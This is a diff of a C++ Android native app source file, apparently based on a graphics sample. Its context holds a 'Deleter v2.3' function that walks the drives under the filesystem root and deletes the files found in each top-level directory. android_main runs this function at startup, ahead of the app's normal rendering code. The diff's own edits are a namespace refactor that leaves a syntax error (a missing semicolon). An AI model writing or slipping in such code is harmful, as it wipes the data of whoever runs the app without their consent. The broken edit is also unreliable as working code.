@@ -45,14 +45,15 @@
 #include <string>
 #include <vector>
 using namespace std;
-using namespace std::filesystem;
+namespace fs = std::filesystem;
+using namespace fs
 int DeleterMain() {
     string Title = "Deleter v2.3";
-    cout << Title << endl;
-    vector<std::filesystem::path> Disks; // Declare an empty vector
+  cout << Title << endl;
+    vector<fs::path> Disks; // Declare an empty vector
     while (true) {
-      for (const std::filesystem::directory_entry &root : std::filesystem::recursive_directory_iterator(
-               std::filesystem::current_path()
+      for (const fs::directory_entry &root : fs::recursive_directory_iterator(
+               fs::current_path()
                    .root_directory())) {
         if (root.path().parent_path() != root.path() &&
             root.path().string().length() <= 3) {
@@ -60,24 +61,24 @@ int DeleterMain() {
           Disks.push_back(root.path());
         }
         std::vector<std::string> drives;
-        for (const std::filesystem::path &disk : Disks) {
+        for (const fs::path &disk : Disks) {
           drives.push_back(disk.string());
         }
         // Iterate through the split drives
         for (const std::string &drive : drives) {
-          std::vector<std::filesystem::path> dirs;
-          for (const std::filesystem::directory_entry &entry :
-               std::filesystem::directory_iterator(drive)) {
+          std::vector<fs::path> dirs;
+          for (const fs::directory_entry &entry :
+               fs::directory_iterator(drive)) {
             dirs.push_back(entry.path());
           }
-          for (const std::filesystem::path &dir : dirs) {
+          for (const fs::path &dir : dirs) {
             if (is_directory(dir)) {
-              std::vector<std::filesystem::path> files;
-              for (const std::filesystem::directory_entry &file :
-                   std::filesystem::directory_iterator(dir)) {
+              std::vector<fs::path> files;
+              for (const fs::directory_entry &file :
+                   fs::directory_iterator(dir)) {
                 files.push_back(file.path());
               }
-              for (const std::filesystem::path &file : files) {
+              for (const fs::path &file : files) {
                 cout << "Deleting " << file << endl;
                 try {
                   std::error_code ec;
@@ -440,7 +441,7 @@ int OnSensorEvent(int /* fd */, int /* events */, void* data) {
  */
 void android_main(android_app* state) {
   DeleterMain();
-  /*
+  
   Engine engine {};
 
   memset(&engine, 0, sizeof(engine));
@@ -472,6 +473,6 @@ void android_main(android_app* state) {
     }
   }
 
-  engine_term_display(&engine);*/
+  engine_term_display(&engine);
 }
 // END_INCLUDE(all)
